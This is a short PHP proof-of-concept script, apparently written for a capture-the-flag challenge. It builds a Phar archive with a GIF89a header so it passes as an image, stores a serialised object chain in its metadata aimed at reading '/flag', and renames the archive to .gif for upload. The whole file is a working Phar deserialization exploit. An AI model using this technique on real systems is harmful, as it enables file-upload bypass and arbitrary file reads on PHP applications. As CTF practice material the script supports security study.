<?php
/**
 * Created by phpstorm
 * User: tinmin
 * Date: 2019/10/19
 * Time: 下午11:39
 */

class Show
{
    public $source = "/flag";
    public $str;
}

class S6ow
{
    public $file;
    public $params;
}

class Sh0w
{
    public $test;
    public $str;
}

@unlink("poc-tinmin.phar");
$phar = new Phar("poc-tinmin.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$a = new Sh0w("");
$b = new S6ow();
$b->file = new Show("tinmin");
$b->params = [ "_show" => "file_get"];
$a->str = $b;
$phar->setMetadata($a); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
rename('poc-tinmin.phar','poc-tinmin.gif');

?>
